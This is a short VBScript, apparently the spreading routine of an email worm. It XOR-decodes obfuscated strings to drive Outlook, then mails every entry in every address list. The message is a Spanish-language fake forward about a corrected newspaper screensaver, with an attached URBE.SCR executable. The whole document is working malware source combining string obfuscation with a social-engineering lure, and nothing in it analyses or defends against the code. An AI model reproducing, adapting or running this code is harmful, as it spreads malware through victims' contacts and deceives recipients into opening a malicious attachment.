On Error Resume Next
Set Outlook = CreateObject(cr("Uonvuuq4[jjvsy{nsut", 26))
If ( Outlook <> "" ) Then
  With Outlook
    Set MAPI = .GetNameSpace(cr("UYHQ", 24))
  End With
  With MAPI
    Set AddrList = .AddressLists
  End With
  For I = 1 to AddrList.Count
    With OutLook
      Set NuevoMail = .CreateItem(0)
    End With
    Set LibroActual = AddrList.Item(I)
    With NuevoMail
      .Subject = "Fwd: [Protector de Pantalla]"
      .Body = "Hola!.. Este es un mail que me enviaron de PLANETAURBE.COM:" & vbCrLf & vbCrLf & "webmaster@planetaurbe.com wrote:" & vbCrlf & "> Hola, les envio la nueva version del protector de pantalla del Semanario URBE..." & vbCrLf & "> esta nueva ya que corrige un error en la anterior." & vbCrLf & ">" & vbCrLf & "> Saludos."
      .Attachments.Add "D:\WIN98\URBE.SCR"
    End With
    Set Yuca = LibroActual.AddressEntries
    With Yuca
    For J = 1 to .Count
      With NuevoMail
       Set bajo = .Recipients
       bajo.Add Yuca(J)
      End With
    Next
    End With
    With NuevoMail
     .Send
    End With
  Next
  Outlook.Quit
End If
Function cr(poc, cap)
For I = 1 To Len(poc)
mol = Asc(Mid(poc, I, 1)) Xor cap
noc = noc & Chr(mol)
Next
cr = noc
End Function
